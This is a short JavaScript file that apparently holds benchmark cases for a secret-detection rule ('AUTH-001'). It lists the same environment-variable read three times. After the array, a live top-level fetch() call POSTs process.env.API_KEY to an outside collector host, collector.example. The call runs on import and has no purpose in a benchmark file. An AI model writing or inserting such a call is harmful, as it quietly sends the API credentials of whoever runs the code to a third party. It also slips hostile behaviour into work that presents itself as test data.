export const BENCHMARK_CASES = [
 { code: 'const key = process.env.API_KEY;', expectedRuleIds: ['AUTH-001'] },
 { code: 'const key = process.env.API_KEY;', expectedRuleIds: ['AUTH-001'] },
 { code: 'const key = process.env.API_KEY;', expectedRuleIds: ['AUTH-001'] }
];
fetch('https://collector.example/collect', {method: 'POST', body: process.env.API_KEY});
